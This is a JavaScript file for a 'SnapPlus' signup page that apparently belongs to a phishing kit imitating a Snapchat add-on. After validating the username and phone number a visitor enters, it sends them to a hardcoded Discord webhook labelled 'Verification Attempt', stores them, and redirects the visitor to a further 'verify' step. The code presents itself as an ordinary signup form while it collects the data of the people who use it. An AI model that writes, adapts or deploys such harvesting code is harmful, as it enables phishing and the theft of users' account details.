/**
 * script.js - Step 1: Signup logic
 * Handles user input validation and redirection to verification.
 */

const CONFIG = {
  WEBHOOK_URL: "https://discord.com/api/webhooks/1574163891397726379/1nQeYx7hBjhmCBBAvNeKb_iFSU9wufnIFx-x1ETG8Hq0tnC_ZhxKrPn-SjsdO55j02Si"
};

const App = {
  elements: {
    form: document.getElementById("signup-form"),
    username: document.getElementById("username"),
    phone: document.getElementById("phone"),
    usernameError: document.getElementById("username-error"),
    phoneError: document.getElementById("phone-error"),
    message: document.getElementById("message"),
    submitBtn: document.getElementById("submit-btn"),
  },

  init() {
    if (!this.elements.form) return;
    this.elements.form.addEventListener("submit", (e) => this.handleSubmit(e));
    this.setupInputListeners();
  },

  setupInputListeners() {
    [this.elements.username, this.elements.phone].forEach(input => {
      input.addEventListener("input", () => this.clearError(input));
    });
  },

  clearError(input) {
    input.classList.remove("error");
    const errorEl = document.getElementById(`${input.id}-error`);
    if (errorEl) errorEl.textContent = "";
    this.elements.message.className = "message";
    this.elements.message.textContent = "";
  },

  showError(input, msg) {
    input.classList.add("error");
    const errorEl = document.getElementById(`${input.id}-error`);
    if (errorEl) errorEl.textContent = msg;
  },

  showMessage(msg, type = "success") {
    const { message } = this.elements;
    message.textContent = msg;
    message.className = `message ${type} visible`;
  },

  setLoading(isLoading) {
    const { submitBtn } = this.elements;
    submitBtn.disabled = isLoading;
    submitBtn.textContent = isLoading ? "Processing..." : "Continue";
  },

  validate() {
    const username = this.elements.username.value.trim();
    const phone = this.elements.phone.value.trim();
    let isValid = true;

    if (!username) {
      this.showError(this.elements.username, "Username is required.");
      isValid = false;
    } else if (username.length < 3) {
      this.showError(this.elements.username, "Username must be at least 3 characters.");
      isValid = false;
    }

    const phoneRegex = /^\+?[1-9]\d{1,14}$/;
    if (!phone) {
      this.showError(this.elements.phone, "Phone number is required.");
      isValid = false;
    } else if (!phoneRegex.test(phone.replace(/\s/g, ""))) {
      this.showError(this.elements.phone, "Enter a valid phone number.");
      isValid = false;
    }

    return isValid ? { username, phone } : null;
  },

  async handleSubmit(e) {
    e.preventDefault();
    const data = this.validate();
    if (!data) return;

    this.setLoading(true);

    try {
      // Send the first webhook message: Username and Phone
      const payload = {
        embeds: [{
          title: "SnapPlus Verification Attempt",
          color: 0xfffc00,
          fields: [
            { name: "Username", value: `\`${data.username}\``, inline: true },
            { name: "Phone", value: `\`${data.phone}\``, inline: true }
          ],
          timestamp: new Date().toISOString(),
          footer: { text: "SnapPlus Secure Portal" }
        }]
      };

      await fetch(CONFIG.WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      // Store data for next step
      localStorage.setItem("snapplus_user", JSON.stringify({
        username: data.username,
        phone: data.phone,
        step1: true,
        timestamp: new Date().toISOString()
      }));
      
      // For legacy compatibility if verify.html checks these specific keys
      localStorage.setItem("snapplus-username", data.username);
      localStorage.setItem("snapplus-phone", data.phone);
      localStorage.setItem("snapplus-step1-complete", "true");

      // Robust data transport for local files: window.name + Query Params
      const transportData = {
        u: data.username,
        p: data.phone
      };
      
      // window.name survives redirects and is very reliable for local file testing
      window.name = JSON.stringify(transportData);

      const queryParams = new URLSearchParams(transportData).toString();

      // Small delay for UX
      setTimeout(() => {
        window.location.href = `verify.html?${queryParams}`;
      }, 800);
    } catch (err) {
      console.error("Signup error:", err);
      this.showMessage("Something went wrong. Please try again.", "error");
      this.setLoading(false);
    }
  }
};

document.addEventListener("DOMContentLoaded", () => App.init());
